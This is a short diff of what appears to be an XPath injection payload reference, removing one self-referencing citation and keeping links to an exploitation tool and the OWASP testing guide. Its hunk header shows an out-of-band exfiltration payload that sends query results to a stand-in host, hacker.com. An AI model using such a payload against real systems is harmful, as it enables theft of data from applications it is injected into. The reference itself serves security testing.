@@ -284,8 +284,6 @@ doc-available(concat("http://hacker.com/oob/", RESULTS))
 - [XmlChor](https://github.com/Harshal35/XMLCHOR)
 
 ## References
-
-- [1] [this collection - XPATH Injection]
 - [2] OWASP Testing Guide - Testing for XPath Injection (OTG-INPVAL-010)
 - [3] [W3Schools - XPath Syntax](https://www.w3schools.com/xml/xpath_syntax.asp)
 
